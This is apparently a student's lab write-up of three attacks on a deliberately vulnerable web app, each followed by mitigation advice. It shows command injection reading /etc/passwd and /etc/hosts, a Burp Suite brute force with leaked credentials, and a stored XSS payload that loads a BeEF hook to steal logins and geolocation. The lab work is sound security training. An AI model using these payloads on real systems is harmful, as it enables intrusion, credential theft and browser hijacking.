<h1>Web Application 1: Command Injection.</h1>
Navigate to /etc/passwd and view the file using the command injection file and Dot Dot Slash technique.
The original purpose of the app is to ping IP Addresses. 

![](/HW-15/Images/15-0%20Command%20Injection.png)

For instance, we ping 8.8.8.8.

Command:

        8.8.8.8
![](/hw-15/Images/15-0.5.png)
Command:

        8.8.8.8 && cat ../../../../../etc/passwd
![](/HW-15/Images/15-1%20Command%20Injection.png)

We can use the exact same technique to also use view the /etc/hosts with minimal changes to the syntax of the command

Command:

        8.8.8.8 && cat ../../../../../etc/hosts
![](/HW-15/Images/15-2%20Command%20Injection.png)

Mitigation:
The easiest way to stop command injection on any system is to rigoriously validate the input. Input validation in this context means that you make sure it does not accept anything except IP addresses when pinging a device. Priviliege control would also work. Make sure that the process initiating the command(ping in this case) doesn't have the prvilege to do anything else on the system (like look at the /etc/passwd and hosts files). 

<h1>Web Application 2: Brute Force</h1>

Our application:

![](/HW-15/Images/15-3%20Brute%20Force.png)
We need to break into this application with a brute force attack in Burp Suite. Capturing the packet of a login attempt gives us this:
![](/HW-15/Images/15-4%20Brute%20Force.png)
We then identify the login and password fields in the unencrypted packet.
![](/HW-15/Images/15-5%20Brute%20Force.png)
We have fortunately been given a list of previously leaked user IDs and passwords. We can load this up in our burp suite and use it to launch an attack. Adding these to our payload by copy and paste gives us the following list of possible user IDs:

![](/HW-15/Images/15-6%20Brute%20Force.png)

And we use this other payload for the perspective list of passwords:

![](/HW-15/Images/15-7%20Brute%20Force.png)

Now we are ready to start our attack, which gives us the following results:

![](/HW-15/Images/15-8%20Brute%20Force.png)

We now know that the sucessful login and password for our application is "tonystark" and "I am Iron Man". But we should test the login and password on our app to be sure.
Entering them in our app we get:

![](/HW-15/Images/15-9%20Brute%20Force.png)

Please note the same "Successful login! You really are Iron Man :)" response that our brute force attack returned. Now we can conclude that our brute force attack really did work and we now have access to the web application.

Mitigation: The first thing that needs to be done is limiting the number of times an IP address can attempt to login with the wrong password. The brute force attack used 100 attempts to try to login. Burp Suite wasn't able to find the correct set of creditials until the 65th time. If the application temporarily suspended the attacking IP addresses ability to attempt to log in with the wrong password it would at the very least make the attack take significantly longer. Doing so would also give the security team time to respond to such an alert.

<h1>Web Application 3: Cross Site Scripting(XSS)</h1>
Using the Browser Exploitation Framework (BeEF) to execute cross site scripting exploitation.

![](/HW-15/Images/15-10Beef.png)

First we will try to hook the DVWA with our beef malware in it's XSS.

![](/HW-15/Images/15-11%20Beef.png)

The command we want to exploit is:

        <script src="http://127.0.0.1:3000/hook.js"></script>

By placing that into the message of the book we can hook this other browser and exploit it.

![](/HW-15/Images/15-12%20Beef.png)

This results in a new IP address being added to the beef list of vulnerable browsers.

![](/HW-15/Images/15-13%20Beef.png)

From here we can use a variety of the exploits available in beef. The first one we used is a generic log in request. Entering our user and password gives them to the Beef Malware. 

![](/HW-15/Images/15-14%20Beef.png)

In this case I supplied the login for the Beef app, beef and feeb.

![](/HW-15/Images/15-15%20Beef.png)

Other exploits include sending a fake update bar, which tells us if the target clicks it.

![](/HW-15/Images/15-16%20Beef.png)

![](/HW-15/Images/15-17%20Beef.png)

Or we can get the target's geolocation data.

![](/HW-15/Images/15-18%20Beef.png)

I of course edited out the PID data.

Mitigation: Cross site scripting can be mitigated with largely the same strategy as mitigating command injection: validating input. The question of mitigating the Man-In-The-Browser attack that Beef in embodies is much more difficult. The best option to defeat Man-In-The-Browser attacks seems to be to ensure that your browser is up to date as much as possible. Otherwise you can train people to notice when their browsers are behaving in a sketchy or suspicious manner. Mitre suggests "restricting user permissions and addressing privilege escalation."
[Source](https://attack.mitre.org/mitigations/T1185/)